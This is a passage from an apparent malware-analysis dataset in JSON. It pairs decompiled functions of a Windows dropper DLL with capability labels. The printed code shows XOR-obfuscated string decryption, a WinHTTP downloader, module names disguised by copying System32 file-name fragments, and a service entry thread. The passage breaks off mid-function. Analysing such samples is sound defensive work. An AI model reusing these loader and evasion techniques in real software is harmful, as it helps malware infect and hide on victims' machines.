        "decompiled_code": "\nuint32_t __cdecl fcn.00403d39(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    char *lpString;\n    uint arglist;\n    uint lpdwNumberOfBytesRead;\n    uint lpdwNumberOfBytesAvailable;\n    \n    iVar1 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)();\n    if (iVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        arglist = 0x77;\n        lpString = \"GTK DLL: downloader.cpp:%d > DoRead : Error %u in WinHttpQueryDataAvailable.\\n\";\n    }\n    else {\n        iVar1 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)();\n        if (iVar1 != 0) {\n            *arg_8h = *arg_8h;\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        arglist = 0x7f;\n        lpString = \"GTK DLL: downloader.cpp:%d > DoRead : Error %u in WinHttpReadData.\\n\";\n    }\n    uVar2 = fcn.00403bde(lpString, arglist);\n    return uVar2 & 0xffffff00;\n}\n",
        "token_count": 278
    },
    "00403db4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.00403db4(uint *arg_8h, uint *arg_ch, int32_t *arg_10h, int32_t *arg_14h, int32_t arg_18h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t *piVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar10;\n    uint *puVar11;\n    ushort *puVar12;\n    uint *puVar13;\n    ushort *puVar14;\n    char *pcVar15;\n    char *pcVar16;\n    ushort *puVar17;\n    uint var_414h;\n    uint lpszHeaders;\n    uint *var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    int32_t var_f4h;\n    uint lpdwBufferLength;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_7fh;\n    uint var_7bh;\n    uint var_77h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_57h;\n    uint var_53h;\n    int32_t *var_48h;\n    int32_t lpBuffer;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    ushort *var_8h;\n    \n    lpszHeaders._0_2_ = 0;\n    var_48h = in_EDX;\n    sub.ntdll.dll_memset(&lpszHeaders + 2, 0, 0xfe);\n    var_414h._0_2_ = 0;\n    sub.ntdll.dll_memset(&var_414h + 2, 0, 0x206);\n    if (arg_8h == 0x40) {\n        var_fch = 0x34367964;\n        var_f8h = 0;\ncode_r0x00403e46:\n        var_100h = 0x6f62722f;\n    }\n    else {\n        if (arg_8h == 0x20) {\n            var_f8h = 0;\ncode_r0x00403e3c:\n            var_fch = 0x32337964;\n            goto code_r0x00403e46;\n        }\n        if (arg_8h == 0x140) {\n            var_f8h = 0x30;\n            goto code_r0x00403e3c;\n        }\n    }\n    var_10ch = &var_100h;\n    if (arg_ch != NULL) {\n        var_10ch = arg_ch;\n    }\n    fcn.00403bde(\"GTK DLL: downloader.cpp:%d > AddressToInt : resolving %p\", 0x4b);\n    fcn.00403bde(\"GTK DLL: downloader.cpp:%d > AddressToInt : resolving %s\", 0x4c);\n    iVar6 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    if (iVar6 == 0) {\n        fcn.00403bde(\"GTK DLL: downloader.cpp:%d > AddressToInt : error while resolving hostname %s\", 0x57);\n        fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : resolve \\'%s\\' error\", 0xe1);\n        return 3;\n    }\n    fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : lpszObjectName : %s\", 0xe8);\n    arg_8h = 0x1;\n    if (*0x427cc0 == 0) {\n        var_ech = 0x6238712f;\n        var_e8h = 0x775e3335;\n        var_e4h = 0x623b710e;\n        var_e0h = 0x7718332e;\n        var_dch = 0x62797157;\n        var_d8h = 0x7717337f;\n        var_d4h = 0x6200714a;\n        var_d0h = 0x77593326;\n        var_cch = 0x62387106;\n        var_c8h = 0x77443338;\n        var_c4h = 0x62197142;\n        var_c0h = 0x7717331b;\n        var_bch = 0x62797154;\n        var_b8h = 0x770c337e;\n        var_b4h = 0x62007142;\n        var_b0h = 0x77593326;\n        var_ach = 0x62637154;\n        var_a8h = 0x77173374;\n        var_a4h = 0x6261711a;\n        var_a0h = 0x770c337b;\n        var_9ch = 0x62257142;\n        var_98h = 0x770d3339;\n        var_94h = 0x62627150;\n        var_90h = 0x77073361;\n        var_8ch = 0x6277714b;\n        var_88h = 0x77523308;\n        var_84h._0_1_ = 1;\n        stack0xffffff79 = 0x20623c71;\n        var_7fh = 0x50771833;\n        var_7bh = 0x7f626671;\n        var_77h = 0x52770733;\n        var_73h = 0x7f626671;\n        var_6fh = 0x42770633;\n        var_6bh = 0x26621171;\n        var_67h = 0x7774533;\n        var_63h = 0x20623171;\n        var_5fh = 0x4d774f33;\n        var_5bh = 0x7a626571;\n        var_57h = 0x52771933;\n        var_53h._0_2_ = 0x5771;\n        var_53h._2_1_ = 0x62;\n        var_40h = 0x62577162;\n        var_3ch = 0x7737334f;\n        fcn.00401000(0x138);\n        puVar12 = var_8h;\n        uVar10 = 0;\n        do {\n            puVar1 = uVar10 + var_8h;\n            uVar7 = uVar10 & 0x80000007;\n            if (uVar7 < 0) {\n                uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n            }\n            uVar10 = uVar10 + 1;\n            *puVar1 = *(&var_40h + uVar7) ^ puVar1[&var_ech - var_8h];\n        } while (uVar10 < 0x9c);\n        fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : decrypt (wide char) %s -> %ws\", 0xeb);\n        *0x427cc0 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(puVar12, 0, 0, 0, 0);\n        if (*0x427cc0 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : WinHttpOpen failed : %d\", 0xf5);\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar12);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            return 1;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x427cc0, 5000, 5000, 5000, 5000);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar12);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    if (in_ECX == 0) {\n        puVar12 = NULL;\n    }\n    else {\n        iVar6 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, (iVar6 + 1) * 2);\n        var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        *var_8h = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0);\n        puVar12 = var_8h;\n    }\n    var_f4h = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x427cc0, puVar12, 0x50, 0);\n    var_28h = 0x42356e5b;\n    var_24h = 0x78236b00;\n    var_20h = 0x427b6e40;\n    var_1ch = 0x787c6b5b;\n    var_18h = 0x42326e16;\n    var_14h = 0x78766b4e;\n    var_10h = 0x426e6e57;\n    var_ch._0_1_ = 0x74;\n    var_ch._1_1_ = 0x6b;\n    var_34h = 0x42416e33;\n    var_30h = 0x78536b74;\n    fcn.00401000(0x3c);\n    puVar14 = var_8h;\n    uVar10 = 0;\n    do {\n        puVar1 = uVar10 + var_8h;\n        uVar7 = uVar10 & 0x80000007;\n        if (uVar7 < 0) {\n            uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n        }\n        uVar10 = uVar10 + 1;\n        *puVar1 = *(&var_34h + uVar7) ^ puVar1[&var_28h - var_8h];\n    } while (uVar10 < 0x1e);\n    pcVar16 = \"wszHttpsNamePortTemplate_EncryptedStackedBuffer\";\n    uVar8 = 0xfe;\n    pcVar15 = \"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : decrypt (wide char) %s -> %ws\";\n    puVar17 = var_8h;\n    fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : decrypt (wide char) %s -> %ws\", 0xfe);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, puVar14, puVar12, 0x50, pcVar15, uVar8, pcVar16, puVar17);\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar12);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    puVar11 = var_10ch;\n    if (var_f4h == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : WinHttpConnect failed : %d\", 0x105);\n        arg_8h = 1;\n        goto code_r0x004045ef;\n    }\n    puVar13 = var_10ch;\n    if (var_10ch != NULL) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_lstrlenA)(var_10ch);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, (iVar6 + 1) * 2);\n        arg_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        *arg_8h = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, puVar11, 0xffffffff, arg_8h, iVar6 + 1);\n        puVar11 = NULL;\n        puVar13 = arg_8h;\n    }\n    iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)(var_f4h, 0x412f0c, puVar13, puVar11, puVar11, puVar11, 0x800140);\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar13);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    if (iVar6 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar8 = 0x11f;\n        pcVar15 = \"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : WinHttpOpenRequest failed : %d\";\ncode_r0x00404498:\n        fcn.00403bde(pcVar15, uVar8);\n        arg_8h = 0x1;\n    }\n    else {\n        var_104h = 0x3300;\n        var_108h = 8;\n        iVar9 = fcn.0040a83f();\n        pcVar3 = _sym.imp.WINHTTP.dll_WinHttpSetOption;\n        if (iVar9 != 0) {\n            var_34h = &var_414h;\n            var_30h = 0;\n            var_38h = 3;\n            fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : setting proxy [%ws] for [%ws]\", 0x133\n                        );\n            (*pcVar3)(iVar6, 0x26, &var_38h, 0xc);\n        }\n        (*pcVar3)(iVar6, 0x1f, &var_104h, 4);\n        (*pcVar3)(iVar6, 0x3f, &var_108h, 4);\n        if (arg_18h != 0) {\n            var_2ch = 0x47326e36;\n            var_28h = 0x360d461e;\n            var_24h = 0x47696e01;\n            var_20h = 0x36084650;\n            var_1ch = 0x47276e1d;\n            var_18h = 0x36194615;\n            var_14h = 0x47766e59;\n            var_10h = 0x36474614;\n            var_ch._0_1_ = 100;\n            var_ch._1_1_ = 0x6e;\n            var_34h = 0x47536e64;\n            var_30h = 0x366a4670;\n            fcn.00401000(0x44);\n            uVar10 = 0;\n            do {\n                puVar1 = uVar10 + arg_8h;\n                uVar7 = uVar10 & 0x80000007;\n                if (uVar7 < 0) {\n                    uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n                }\n                uVar10 = uVar10 + 1;\n                *puVar1 = *(&var_34h + uVar7) ^ puVar1[&var_2ch - arg_8h];\n            } while (uVar10 < 0x22);\n            pcVar16 = \"wszRangeBytesTemplate_EncryptedStackedBuffer\";\n            uVar8 = 0x149;\n            pcVar15 = \"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : decrypt (wide char) %s -> %ws\";\n            puVar11 = arg_8h;\n            fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : decrypt (wide char) %s -> %ws\", 0x149\n                        );\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, arg_8h, arg_18h, pcVar15, uVar8, pcVar16, puVar11);\n            uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(iVar6, &lpszHeaders, uVar8);\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            puVar14 = var_8h;\n        }\n        iVar9 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(iVar6, 0, 0xffffffff, 0, 0, 0, 0);\n        if (iVar9 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar8 = 0x154;\n            pcVar15 = \"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : WinHttpSendRequest failed : %d\";\n            goto code_r0x00404498;\n        }\n        iVar9 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(iVar6, 0);\n        if (iVar9 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar8 = 0x15a;\n            pcVar15 = \"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : WinHttpReceiveResponse failed : %d\";\n            goto code_r0x00404498;\n        }\n        lpdwBufferLength = 4;\n        lpBuffer = 0;\n        arg_ch = NULL;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(iVar6, 0x20000005, 0, &lpBuffer, &lpdwBufferLength, 0);\n        fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : WinHttpQueryHeaders WINHTTP_QUERY_CONTENT_LENGTH : %d\"\n                     , 0x168);\n        piVar4 = arg_10h;\n        if (*arg_10h == 0) {\n            *arg_10h = lpBuffer;\n        }\n        lpdwBufferLength = 4;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(iVar6, 0x20000013, 0, &arg_ch, &lpdwBufferLength, 0);\n        fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : WinHttpQueryHeaders WINHTTP_QUERY_STATUS_CODE : %d\"\n                     , 0x175);\n        if ((arg_ch == 0xce) || (arg_ch == 0xc8)) {\n            if (var_48h[1] == 0) {\n                fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : allocate pBuffer->pbData\", 0x17c)\n                ;\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpBuffer);\n                iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                *var_48h = 0;\n                var_48h[1] = iVar9;\n            }\n            else {\n                fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : already allocated pBuffer->pbData\"\n                             , 0x181);\n            }\n            cVar5 = fcn.00403d39(var_48h);\n            if (cVar5 == '\\0') {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFileRecursiveImpl : DoRead failed : %d\", 0x186);\n                arg_8h = 0x4;\n            }\n            else {\n                iVar2 = *piVar4;\n                iVar9 = *var_48h;\n                *arg_14h = iVar9;\n                if ((iVar2 == 0) || (iVar9 == *piVar4)) {\n                    arg_8h = NULL;\n                }\n                else {\n                    arg_8h = 0x6;\n                }\n            }\n        }\n        else {\n            arg_8h = 0x3;\n        }\n    }\n    if (iVar6 != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n    }\ncode_r0x004045ef:\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar14);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    if (var_f4h != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(var_f4h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 5004
    },
    "00404921": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404921(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    int16_t *piVar10;\n    uint32_t in_EDX;\n    uint32_t uVar11;\n    code *pcVar12;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int16_t *var_2ch;\n    int16_t *var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t lpFindFileData;\n    int16_t *lpMem;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_1ch = 0;\n    var_24h = 0;\n    var_4h = 0;\n    var_ch = in_EDX;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x250);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    if (lpFindFileData == 0) {\n        return var_24h;\n    }\n    uVar4 = (*pcVar12)(0, 0x208);\n    iVar5 = (*pcVar3)(uVar4);\n    var_20h = iVar5;\n    if (iVar5 == 0) goto code_r0x00404bb3;\n    uVar4 = (*pcVar12)(0, 0x208);\n    lpMem = (*pcVar3)(uVar4);\n    if (lpMem != NULL) {\n        sub.ntdll.dll_memset(lpMem, 0, 0x208);\n        var_40h = 0x4d1b4e30;\n        var_3ch = 0x30245a56;\n        var_38h = 0x4d544e14;\n        var_34h._0_2_ = 0x5a78;\n        var_30h = 0x4d314e6c;\n        var_2ch = 0x30415a78;\n        fcn.00401000(0x1c);\n        piVar10 = var_28h;\n        uVar11 = 0;\n        do {\n            puVar1 = uVar11 + var_28h;\n            uVar6 = uVar11 & 0x80000007;\n            if (uVar6 < 0) {\n                uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n            }\n            uVar11 = uVar11 + 1;\n            *puVar1 = *(&var_30h + uVar6) ^ puVar1[&var_40h - var_28h];\n        } while (uVar11 < 0xe);\n        fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenModuleName : decrypt (wide char) %s -> %ws\", 0x7a);\n        pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        piVar9 = piVar10;\n        do {\n            iVar2 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar2 != var_1ch);\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(iVar5, 0x103 - (piVar9 - (piVar10 + 1) >> 1));\n        pcVar3 = _sym.imp.ntdll.dll_RtlRandom;\n        if (iVar7 == 0) {\ncode_r0x00404b8a:\n            uVar4 = (*pcVar12)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        else {\n            if (var_8h == 0) {\n                var_ch = (*_sym.imp.ntdll.dll_RtlRandom)(arg_ch);\n                var_ch = var_ch & 0xff;\n                arg_8h = (*pcVar3)(arg_ch);\n                arg_8h = arg_8h & 0xff;\n                iVar5 = var_20h;\n            }\n            var_8h = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar5, piVar10);\n            var_10h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar5, lpFindFileData);\n            piVar9 = lpMem;\n            iVar7 = lpFindFileData;\n            if (var_10h == -1) {\n                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenModuleName : System file not found: \\\"%S\\\"\", 0xa9);\n                goto code_r0x00404b8a;\n            }\n            for (var_24h = 0; (var_24h <= var_ch || (var_24h <= var_8h)); var_24h = var_24h + 1) {\n                if ((var_24h == var_ch) || (var_24h == var_8h)) {\n                    iVar5 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar7 + 0x2c, 0, 0x2e);\n                    uVar11 = 0;\n                    uVar6 = (iVar5 + (-0x2c - iVar7) >> 1) >> 1;\n                    if ((var_4h != 0) && (uVar11 = uVar6 - 4,  uVar6 < uVar11)) {\n                        uVar11 = 0;\n                    }\n                    if (4 < uVar6) {\n                        uVar6 = 4;\n                    }\n                    var_2ch = piVar9 + 1;\n                    piVar10 = piVar9;\n                    do {\n                        iVar2 = *piVar10;\n                        piVar10 = piVar10 + 1;\n                    } while (iVar2 != var_1ch);\n                    (*_sym.imp.ntdll.dll_wcsncat)(piVar9 + (piVar10 - var_2ch >> 1), iVar7 + (uVar11 + 0x16) * 2, uVar6)\n                    ;\n                    var_4h = var_4h + uVar6;\n                    iVar5 = var_20h;\n                }\n                iVar8 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_10h, iVar7);\n                if (iVar8 == 0) {\n                    var_10h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar5, iVar7);\n                }\n            }\n            var_24h = 1;\n            *arg_10h = piVar9;\n            piVar9[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_10h);\n            pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar10 = var_28h;\n        }\n        uVar4 = (*pcVar12)(0, piVar10);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    uVar4 = (*pcVar12)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\ncode_r0x00404bb3:\n    uVar4 = (*pcVar12)(0, lpFindFileData);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return var_24h;\n}\n",
        "token_count": 1826
    },
    "00405857": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00405857(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    ushort uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uchar *puVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint *puVar14;\n    char *pcVar15;\n    char *pcVar16;\n    uint var_330h;\n    uint var_128h;\n    uint var_e8h;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_a8h = 0x208;\n    var_24h = 0;\n    fcn.00403bde(0x4141b8, 0x1e6);\n    iVar6 = fcn.00404f5e();\n    if (iVar6 == 0) {\n        fcn.0040508e();\n        fcn.0040f101();\n    }\n    while (iVar6 = fcn.0040ff4f(),  pcVar2 = _sym.imp.KERNEL32.dll_VirtualProtect,  iVar6 != 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    iVar6 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x427910, 0x184, 0x40, &var_a4h);\n    if (iVar6 != 0) {\n        fcn.0040cf05();\n        (*pcVar2)(0x427910, 0x184, var_a4h, &var_a4h);\n    }\n    puVar11 = 0x427cd0;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.0040797b();\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : g_CurrentModulePath : %ws\", 0x20d);\n    puVar14 = &var_94h;\n    for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    puVar14 = &var_a0h;\n    for (iVar6 = 0xc; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    puVar11 = 0x427cc4;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    puVar14 = &var_330h;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    iVar6 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_330h, &var_a8h);\n    var_2ch = 7;\n    if (iVar6 != 0) {\n        var_1ch = 0x671e6c14;\n        var_18h = 0x413d6c16;\n        var_14h._0_1_ = 0x22;\n        var_14h._1_1_ = 0x4d;\n        var_14h._2_2_ = 0x5326;\n        var_10h._0_2_ = 0x6f21;\n        var_10h._2_2_ = 0x6c04;\n        var_ch._0_2_ = 0x674d;\n        var_8h = 0x674d6c41;\n        var_4h = var_4h & 0xff000000 | 0x6f6c53;\n        fcn.00401000(0x24);\n        iVar6 = var_28h;\n        iVar12 = 0;\n        do {\n            puVar1 = iVar12 + var_28h;\n            iVar10 = iVar12 % var_2ch;\n            iVar12 = iVar12 + 1;\n            *puVar1 = *(&var_8h + iVar10) ^ puVar1[&var_1ch - var_28h];\n        } while (iVar12 < 0x12);\n        fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : decrypt (wide char) %s -> %ws\", 0x216);\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar6, &var_330h);\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    }\n    iVar6 = fcn.00409f97();\n    if (iVar6 == 0) {\n        uVar7 = 0x21f;\n        pcVar16 = \"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : Failed to resolve current user SID.\";\n    }\n    else {\n        if (2 < var_94h._1_1_) {\n            iVar6 = 0;\n            if (0 < var_94h._1_1_ - 2) {\n                do {\n                    *0x427ccc = *0x427ccc + (&var_88h)[iVar6];\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < var_94h._1_1_ - 2);\n            }\n        }\n        *0x427ccc = *0x427ccc ^ 0x43103655;\n        iVar6 = fcn.00404bcc();\n        if (iVar6 != 0) {\n            if (*0x427d48 < 6) {\n                var_70h = 0x73104011;\n                var_6ch = 0x519174f;\n                var_68h = 0x767f411c;\n                var_64h = 0x46b634f;\n                var_60h = 0x73105312;\n                var_5ch = 0x519174f;\n                var_58h = 0x767f411c;\n                var_54h._0_2_ = 0x634f;\n                var_54h._2_1_ = 0x6b;\n                var_54h._3_1_ = 7;\n                var_50h = 0x7610531b;\n                var_4ch = 0x519174f;\n                var_48h = 0x767f411c;\n                var_44h._0_2_ = 0x634f;\n                var_44h._2_1_ = 0x6b;\n                var_40h = 0x76105300;\n                var_3ch = 0x519174f;\n                var_38h = 0x767f411c;\n                var_34h = 0x46b634f;\n                var_30h._0_2_ = 0x5314;\n                var_30h._2_1_ = 0x38;\n                var_8h = 0x37387a55;\n                var_4h = 0x46505874;\n                var_44h._3_1_ = var_54h._3_1_;\n                fcn.00401000(0x43);\n                iVar6 = var_28h;\n                